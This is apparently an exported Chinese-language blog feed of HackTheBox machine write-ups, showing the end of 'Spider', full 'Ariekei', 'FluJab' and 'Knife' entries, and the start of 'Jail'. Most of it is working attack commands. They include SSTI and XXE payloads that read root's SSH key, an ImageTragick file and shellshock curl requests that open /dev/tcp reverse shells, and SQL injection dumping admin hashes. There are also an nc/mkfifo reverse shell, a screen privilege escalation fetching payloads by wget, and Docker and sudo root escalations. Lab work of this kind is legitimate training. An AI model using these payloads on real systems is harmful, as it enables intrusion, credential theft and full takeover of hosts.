&lt;&amp;1&#39;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgPCYxJw&#x3D;&#x3D;&#123;% with a &#x3D; request[&quot;application&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&quot;\\x5f\\x5fimport\\x5f\\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNS80NDMgPCYxJw&#x3D;&#x3D; | base64 -d | bash&quot;)[&quot;read&quot;]() %&#125; a &#123;% endwith %&#125; user flagchiv用户目录得到user.txt: chiv用户.ssh目录直接有私钥，后面可以直接用这个方便操作 提权信息本地8080端口 123456789chiv@spider:~$ ss -tuplnNetid State Recv-Q Send-Q Local Address:Port Peer Address:Portudp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:*tcp LISTEN 0 100 127.0.0.1:8080 0.0.0.0:*tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 128 [::]:22 [::]:* 转发出来访问： 1ssh -i chiv_id_rsa -L 8080:127.0.0.1:8080 chiv@10.10.10.243 8080 site任意用户名都可以登录，注意登录参数有个version，content-type是xhtml+xml： XXE https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection 1username&#x3D;%26username%3b&amp;version&#x3D;1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;+]&gt;&lt;!-- root key所以就可以通过xxe得到root用户ssh私钥 1username&#x3D;%26username%3b&amp;version&#x3D;1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+&quot;file:&#x2F;&#x2F;&#x2F;root&#x2F;.ssh&#x2F;id_rsa&quot;&gt;+]&gt;&lt;!-- root flagssh登录，得到root.txt: 参考资料 https://pypi.org/project/flask-unsign/ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection HTB Spider [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Spider-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Ariekei - HackTheBox","slug":"Ariekei-HackTheBox","date":"2021-06-02T05:23:42.000Z","updated":"2021-06-02T05:26:26.368Z","comments":true,"path":"2021/06/02/Ariekei-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/06/02/Ariekei-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/115 10.10.10.65 端口扫描两个ssh，一个443: 12345678910111213141516171819202122232425262728293031323334$ nmap -sC -sV 10.10.10.65Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 14:17 CSTNmap scan report for 10.10.10.65Host is up (0.068s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)| 256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)|_ 256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)443/tcp open ssl/http nginx 1.10.2|_http-server-header: nginx/1.10.2|_http-title: Site Maintenance| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb| Not valid before: 2017-09-24T01:37:05|_Not valid after: 2045-02-08T01:37:05|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.11022/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)| 2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)| 256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)|_ 256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds 443直接访问是正在开发： 证书里有两个域名，加hosts： 110.10.10.65 calvin.ariekei.htb beehive.ariekei.htb 分别访问，一个404，一个正在开发： 目录扫描12345678910gobuster dir -u https://beehive.ariekei.htb/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/blog (Status: 301) [Size: 325] [--&gt; http://beehive.ariekei.htb/blog/]/cgi-bin/ (Status: 403) [Size: 295]/index.html (Status: 200) [Size: 487]gobuster dir -u https://beehive.ariekei.htb/cgi-bin/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,cgi,html,txt -t 50/stats (Status: 200) [Size: 1223]gobuster dir -u https://calvin.ariekei.htb/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/upload (Status: 200) [Size: 1656] blog stats访问得到一些系统信息，bash 4.2.37： upload一个文件上传，正常上传没反应，标题是”Image Converter”，应该是做图像转换的： shellshock4.2.37的bash可能存在shellshock，但测试只能得到一个表情： 1curl -k -H \"User-Agent: () &#123; :; &#125;; /bin/miao\" https://beehive.ariekei.htb/cgi-bin/stats ImageTragick图像转换相关，一般是通过ImageMagick，搜到这个漏洞 ImageTragickhttps://imagetragick.com/ 直接上传恶意文件，转换时执行代码，得到docker 容器reverse shell： shell.mvg1234push graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;&quot;|setsid &#x2F;bin&#x2F;bash -i &gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.14&#x2F;443 0&lt;&amp;1 2&gt;&amp;1&quot;)&#39;mspop graphic-context 信息容器内枚举信息,发现bastion相关，1022端口就是它的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445mount -l/dev/mapper/ariekei--vg-root on /app type ext4 (rw,relatime,errors=remount-ro,data=ordered)/dev/mapper/ariekei--vg-root on /common type ext4 (ro,relatime,errors=remount-ro,data=ordered)[root@calvin .secrets]# pwdpwd/common/.secrets[root@calvin .secrets]# ls -alls -altotal 16drwxrwxr-x 2 root root 4096 Sep 24 2017 .drwxr-xr-x 5 root root 4096 Sep 23 2017 ..-r--r----- 1 root root 1679 Sep 23 2017 bastion_key-r--r----- 1 root root 393 Sep 23 2017 bastion_key.pub[root@calvin bastion-live]# pwdpwd/common/containers/bastion-live[root@calvin bastion-live]# lslsDockerfilebuild.shsshd_configstart.shcat DockerfileFROM rastasheep/ubuntu-sshdRUN echo \"root:Ib3!kTEvYw6*P7s\" | chpasswdRUN mkdir -p /root/.sshRUN echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka\" &gt; /root/.ssh/authorized_keys[root@calvin bastion-live]# cat build.shcat build.sh#!/bin/bash[root@calvin bastion-live]# cat start.shcat start.shdocker run \\-v /dev/null:/root/.sh_history \\-v /dev/null:/root/.bash_history \\--restart on-failure:5 \\--net arieka-live-net --ip 172.23.0.253 \\-h ezra.ariekei.htb --name bastion-live -dit \\-v /opt/docker:/common:ro \\-v $(pwd)/sshd_config:/etc/ssh/sshd_config:ro \\-p 1022:22 bastion-templatedocker network connect --ip 172.24.0.253 arieka-test-net bastion-live bastion使用得到的信息可以登录bastion docker： 信息这个同样有common containers文件夹，里面查看配置,可以发现waf，就是前面443那里只能得到表情的原因,另外根据nginx配置可以知道beehive.ariekei.htb是blog-test： 1234root@ezra:/common/containers/waf-live# pwd/common/containers/waf-liveroot@ezra:/common/containers/waf-live# cat modsecurity.confroot@ezra:/common/containers/waf-live# cat nginx.conf shellshock现在可以在内部进行shellshock，从而不受waf影响： Apache mod_cgi - ‘Shellshock’ Remote Command Injection - Linux remote Exploithttps://www.exploit-db.com/exploits/34900 1root@ezra:~# python 34900.py payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats blog 现在我们有blog的www-data，前面的文件里得到有root密码,所以可以直接转发端口u方便操作，打reverse shell后升级tty，切到root： 12345678root:Ib3!kTEvYw6*P7sssh -i bastion_key root@10.10.10.65 -p 1022 -L 8443:172.24.0.2:80# /bin/bash 绝对路径curl -H \"User-Agent: () &#123; :; &#125;; echo ; echo ; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/172.24.0.253/1234 0&gt;&amp;1'\" http://127.0.0.1:8443/cgi-bin/statspython -c 'import pty; pty.spawn(\"/bin/bash\")' user flagblog容器的用户目录里得到user.txt: spanishdancerblog用户目录.ssh目录有个加密的私钥，破解 1234python /usr/share/john/ssh2john.py temp_rsa &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtpurple1 (temp_rsa) 这个私钥和密码登录宿主机的spanishdancer用户： 提权信息当前用户在docker组里： 12spanishdancer@ariekei:~$ iduid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker) Privilege escalation via Docker - Chris Fosterhttps://fosterelli.co/privilege-escalation-via-docker.html 提权 &amp; root flag就是直接挂载读取，或者挂载后修改权限外部读取 1docker run -v /:/rootfs -i -t bash 参考资料 Bash - ‘Shellshock’ Environment Variables Command Injection - Linux remote Exploithttps://www.exploit-db.com/exploits/34766 ImageTragickhttps://imagetragick.com/ Apache mod_cgi - ‘Shellshock’ Remote Command Injection - Linux remote Exploithttps://www.exploit-db.com/exploits/34900 Privilege escalation via Docker - Chris Fosterhttps://fosterelli.co/privilege-escalation-via-docker.html HackTheBox - Ariekei | Boojhttps://reboare.github.io/hackthebox/ariekei.html https://www.hackthebox.eu/home/machines/writeup/115 HackTheBox - Ariekei - YouTubehttps://www.youtube.com/watch?v=Pc4tzsn-ats&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"FluJab - HackTheBox","slug":"FluJab-HackTheBox","date":"2021-05-28T01:13:32.000Z","updated":"2021-05-28T01:25:30.752Z","comments":true,"path":"2021/05/28/FluJab-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/28/FluJab-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/171 10.10.10.124 端口扫描常规web端口，但HTTPS证书里很多域名： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121$ nmap -sC -sV 10.10.10.124Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 14:51 CSTNmap scan report for 10.10.10.124Host is up (0.068s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh?|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open http nginx|_http-server-header: ClownWare Proxy|_http-title: Did not follow redirect to https://10.10.10.124/443/tcp open ssl/https ClownWare Proxy| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 301 Moved Permanently| Date: Thu, 27 May 2021 06:51:58 GMT| Content-Type: text/html| Content-Length: 178| Connection: close| Location: https://clownware.htb/cwerror_pages.php| Server: ClownWare Proxy| &lt;html&gt;| &lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;| &lt;body bgcolor=\"white\"&gt;| &lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;| &lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;| &lt;/body&gt;| &lt;/html&gt;| GetRequest:| HTTP/1.1 200 OK| Date: Thu, 27 May 2021 06:51:57 GMT| Content-Type: text/html; charset=UTF-8| Connection: close| Server: ClownWare Proxy| &lt;!DOCTYPE html&gt;| &lt;!--[if lt IE 7]&gt; &lt;html class=\"no-js ie6 oldie\" lang=\"en-US\"&gt; &lt;![endif]--&gt;| &lt;!--[if IE 7]&gt; &lt;html class=\"no-js ie7 oldie\" lang=\"en-US\"&gt; &lt;![endif]--&gt;| &lt;!--[if IE 8]&gt; &lt;html class=\"no-js ie8 oldie\" lang=\"en-US\"&gt; &lt;![endif]--&gt;| &lt;!--[if gt IE 8]&gt;&lt;!--&gt;| &lt;html class=\"js\" style=\"opacity: 1; visibility: visible;\" lang=\"en-US\"&gt;&lt;!--&lt;![endif]--&gt;&lt;head&gt;| &lt;title&gt;Direct IP access not allowed | ClownWare&lt;/title&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge,chrome=1\"&gt;| &lt;meta name=\"robots\" content=\"noindex, nofollow\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1,maximum-scale=1\"&gt;| &lt;link rel=\"stylesheet\" id=\"cf_styles-css\" href=\"index_files| HTTPOptions:| HTTP/1.1 405 Not Allowed| Date: Thu, 27 May 2021 06:51:58 GMT| Content-Type: text/html| Content-Length: 166| Connection: close| Server: ClownWare Proxy| &lt;html&gt;| &lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;| &lt;body bgcolor=\"white\"&gt;| &lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;| &lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;| &lt;/body&gt;|_ &lt;/html&gt;|_http-server-header: ClownWare Proxy|_http-title: Direct IP access not allowed | ClownWare| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb| Not valid before: 2018-11-28T14:57:03|_Not valid after: 2023-11-27T14:57:03|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.18080/tcp open ssl/http nginx|_http-server-header: ClownWare Proxy|_http-title: Direct IP access not allowed | ClownWare| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb| Not valid before: 2018-11-28T14:57:03|_Not valid after: 2023-11-27T14:57:03|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.11 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port443-TCP:V=7.91%T=SSL%I=7%D=5/27%Time=60AF418D%P=x86_64-apple-darwinSF:19.6.0%r(GetRequest,E1E,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Thu,\\x2027\\SF:x20May\\x202021\\x2006:51:57\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20chaSF:rset=UTF-8\\r\\nConnection:\\x20close\\r\\nServer:\\x20ClownWare\\x20Proxy\\r\\nSF:\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;!--\\[if\\x20lt\\x20IE\\x207\\]&gt;\\x20&lt;html\\x20class=SF:\\\"no-js\\x20ie6\\x20oldie\\\"\\x20lang=\\\"en-US\\\"&gt;\\x20&lt;!\\[endif\\]--&gt;\\n&lt;!--\\[iSF:f\\x20IE\\x207\\]&gt;\\x20\\x20\\x20\\x20&lt;html\\x20class=\\\"no-js\\x20ie7\\x20oldie\\\"SF:\\x20lang=\\\"en-US\\\"&gt;\\x20&lt;!\\[endif\\]--&gt;\\n&lt;!--\\[if\\x20IE\\x208\\]&gt;\\x20\\x20\\xSF:20\\x20&lt;html\\x20class=\\\"no-js\\x20ie8\\x20oldie\\\"\\x20lang=\\\"en-US\\\"&gt;\\x20&lt;!SF:\\[endif\\]--&gt;\\n&lt;!--\\[if\\x20gt\\x20IE\\x208\\]&gt;&lt;!--&gt;\\n&lt;html\\x20class=\\\"js\\\"\\SF:x20style=\\\"opacity:\\x201;\\x20visibility:\\x20visible;\\\"\\x20lang=\\\"en-US\\SF:\"&gt;&lt;!--&lt;!\\[endif\\]--&gt;&lt;head&gt;\\n&lt;title&gt;Direct\\x20IP\\x20access\\x20not\\x20allSF:owed\\x20\\|\\x20ClownWare&lt;/title&gt;\\n&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n&lt;meta\\x20SF:http-equiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;\\x20charset=UTF-8\\\"&gt;SF:\\n&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content=\\\"IE=Edge,chrome=1SF:\\\"&gt;\\n&lt;meta\\x20name=\\\"robots\\\"\\x20content=\\\"noindex,\\x20nofollow\\\"&gt;\\n&lt;meSF:ta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,initial-scale=1SF:,maximum-scale=1\\\"&gt;\\n&lt;link\\x20rel=\\\"stylesheet\\\"\\x20id=\\\"cf_styles-css\\SF:\"\\x20href=\\\"index_files\")%r(HTTPOptions,141,\"HTTP/1\\.1\\x20405\\x20Not\\x2SF:0Allowed\\r\\nDate:\\x20Thu,\\x2027\\x20May\\x202021\\x2006:51:58\\x20GMT\\r\\nCoSF:ntent-Type:\\x20text/html\\r\\nContent-Length:\\x20166\\r\\nConnection:\\x20clSF:ose\\r\\nServer:\\x20ClownWare\\x20Proxy\\r\\n\\r\\n&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;405\\SF:x20Not\\x20Allowed&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body\\x20bgcolor=\\\"white\\\"&gt;\\r\\n&lt;cenSF:ter&gt;&lt;h1&gt;405\\x20Not\\x20Allowed&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;nginx&lt;/centeSF:r&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n\")%r(FourOhFourRequest,186,\"HTTP/1\\.1\\x2030SF:1\\x20Moved\\x20Permanently\\r\\nDate:\\x20Thu,\\x2027\\x20May\\x202021\\x2006:5SF:1:58\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x20178\\r\\nSF:Connection:\\x20close\\r\\nLocation:\\x20https://clownware\\.htb/cwerror_pagSF:es\\.php\\r\\nServer:\\x20ClownWare\\x20Proxy\\r\\n\\r\\n&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;SF:301\\x20Moved\\x20Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body\\x20bgcolor=\\\"white\\SF:\"&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301\\x20Moved\\x20Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;cenSF:ter&gt;nginx&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 192.72 seconds 80/443直接访问80跳到443，ClownWare代理error页面： ssl信息得到的所有域名都加hosts： 123456789101112131415161718echo | openssl s_client -showcerts -servername 10.10.10.124 -connect 10.10.10.124:443 2&gt;/dev/null | openssl x509 -inform pem -noout -text | grep DNS | tr \",\" \"\\n\" | cut -d: -f2clownware.htbsni147831.clownware.htb*.clownware.htbproxy.clownware.htbconsole.flujab.htbsys.flujab.htbsmtp.flujab.htbvaccine4flu.htbbestmedsupply.htbcustoomercare.megabank.htbflowerzrus.htbchocolateriver.htbmeetspinz.htbrubberlove.htbfreeflujab.htbflujab.htb 兔子洞/入口点就是一个个访问，排除，发现入口点freeflujab.htb和smtp.flujab.htb： freeflujab.htb访问freeflujab.htb会得到几个cookie： Patient就是ip的md5，另外两个是base64： smtp_configModus应该是控制config的： 直接访问这个路径是denied，但如果修改cookie，可以访问： 12echo -n Configure=True | base64Q29uZmlndXJlPVRydWU= 可以配置smtp服务器，格式存在前端校验，简单绕过，修改为自己的服务器： 1sudo python -m smtpd -n -c DebuggingServer 10.10.14.5:25 这个可以修改配置成功，但应该还需要另一个地方触发调用： 注册同样是修改cookie，注册,失败： 12echo -n a2ebd5abc8b9a8d2d57a510a9f24aad3=True | base64YTJlYmQ1YWJjOGI5YThkMmQ1N2E1MTBhOWYyNGFhZDM9VHJ1ZQ== remind提醒功能可以根据ID发邮件提醒，应该可以触发前面修改的smtp，但需要知道一个有效的ID： 取消取消功能没有校验，符合格式的ID即可： 注意邮件标题，Ref后面应该是还有东西的，因为我们给的ID不存在导致为空，这里可能SQL注入 SQL注入简单的尝试，结合smtp log判断： 1234567891011121314151617181920212223nhsnum=NHS-012-345-6789'+UNION+SELECT+1,2,3,4,5;+--+-&amp;submit=Cancel+Appointment3@@version10.1.37-MariaDB-0+deb9u1database()vaccinations'+UNION+select+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS;+--+-MedStaff# 修改偏移得到所有信息'+UNION+SELECT+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS+LIMIT+0,1;+--+-information_schema# 所有表'+UNION+SELECT+1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5+FROM+INFORMATION_SCHEMA.COLUMNS+where+TABLE_SCHEMA='MedStaff'+LIMIT+0,1;+--+--# 最终得到admin密码' UNION SELECT 1,2,concat(loginname,':',password,':',access),4,5 FROM admin#sysadm:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:sysadmin-console-01.flujab.htb明文： th3doct0r sysadmin得到的域名同样加hosts访问： 12sysadmin-console-01.flujab.htbsysadm : th3doct0r 这个要8080端口(可能会因为Origin header得到403，burp里添加规则去掉这个header即可)： ssh keys 自带notepad功能，可以浏览文件，发现一些ssh公钥： Debian-ssh根据相关信息搜到是CVE-2008-0166，根据公钥得到私钥 https://github.com/g0tmi1k/debian-ssh 123awk '&#123;print $2&#125;' 0223269.pub| base64 -d | md5sumdead0b5b829ea2e3d22f47a7cbde17a6 - SSH &amp; user flag根据公钥得到md5，rsa 4096里有这个对应的私钥,但直接连接是reset 1234dead0b5b829ea2e3d22f47a7cbde17a6ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124kex_exchange_identification: read: Connection reset by peer ssh_wl修改配置文件，允许我们的ip(注意最后要有个空行，坑： user.txt然后就可以ssh登录，得到user.txt: rbash to bash默认的是rbash，很多命令不能用，可以转换成bash，修复下环境变量： https://gtfobins.github.io/gtfobins/make/#shell 1234567COMMAND='/bin/bash'make -s --eval=$'x:\\n\\t-'\"$COMMAND\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin# 也可以登录时候指定bash,同样需要修复环境变量ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124 -t bashPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 提权信息suid发现两个screen： 1234567891011121314151617drno@flujab:~$ find / -user root -perm /4000 2&gt;/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/local/share/screen/screen/usr/bin/chsh/usr/bin/newgrp/usr/bin/passwd/usr/bin/chfn/usr/bin/screen/usr/bin/gpasswd/usr/bin/sudo/bin/su/bin/umount/bin/mount/bin/ping/bin/fusermount 搜到： GNU Screen 4.5.0 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/41154 提权 &amp; root flag因为服务器没有gcc，所以需要本地编译后传上去,一步步运行得到root shell,读取root.txt(755问题用绝对路径解决： 12345678910wget http://10.10.14.5:7777/rootshellwget http://10.10.14.5:7777/libhax.sochmod +x *cd /etcumask 000 # because/usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\" # newline needed/usr/local/share/screen/screen -ls # screen itself is setuid, so... /tmp/rootshell 参考资料 https://github.com/g0tmi1k/debian-ssh https://gtfobins.github.io/gtfobins/make/#shell GNU Screen 4.5.0 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/41154 HTB: FluJab | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/06/15/htb-flujab.html https://www.hackthebox.eu/home/machines/writeup/171 HackTheBox - Flujab - YouTubehttps://www.youtube.com/watch?v=_f9Xygr-qHU&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Knife - HackTheBox","slug":"Knife-HackTheBox","date":"2021-05-24T05:59:30.000Z","updated":"2021-08-30T01:16:46.445Z","comments":true,"path":"2021/05/24/Knife-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/24/Knife-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/347 10.10.10.242 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV 10.10.10.242Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 13:08 CSTNmap scan report for 10.10.10.242Host is up (0.064s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 39.26 seconds 80 PHP backdoorPHP/8.1.0-dev,这个之前被供应链加过后门： php.internals: Changes to Git commit workflowhttps://news-web.php.net/php.internals/113838 可以直接执行命令： reverse shell &amp; user flag直接打到james用户shell，用户目录user.txt: 12rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 4444 &gt;/tmp/fpython3 -c 'import pty;pty.spawn(\"/bin/bash\")' 另外james用户.ssh目录直接有一对公私钥，可以用这个后面直接ssh方便操作： 123james@knife:~/.ssh$ cat id_rsa.pub &gt; authorized_keysssh -i james_id_rsa james@10.10.10.242 提权信息sudo 发现knife，这是chef workstation里的： https://docs.chef.io/workstation/knife/ 根据文档，exec可以执行ruby代码，所以就可以直接用sudo执行ruby的提权方式： https://docs.chef.io/workstation/knife_exec/ https://gtfobins.github.io/gtfobins/ruby/#sudo 提权 &amp; root flag1sudo /usr/bin/knife exec -E 'exec \"/bin/bash\"' 参考资料 php.internals: Changes to Git commit workflowhttps://news-web.php.net/php.internals/113838 https://docs.chef.io/workstation/knife_exec/ https://gtfobins.github.io/gtfobins/ruby/#sudo [HTB] Hackthebox knife Writeup – HACKINGWEBSERVICEhttps://codingsec.wordpress.com/2021/05/23/htb-hackthebox-knife-writeup/ HackTheBox-Knife 靶场实战https://mp.weixin.qq.com/s/W4jMaDZi95uOPlHz2gFEtQ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Jail - 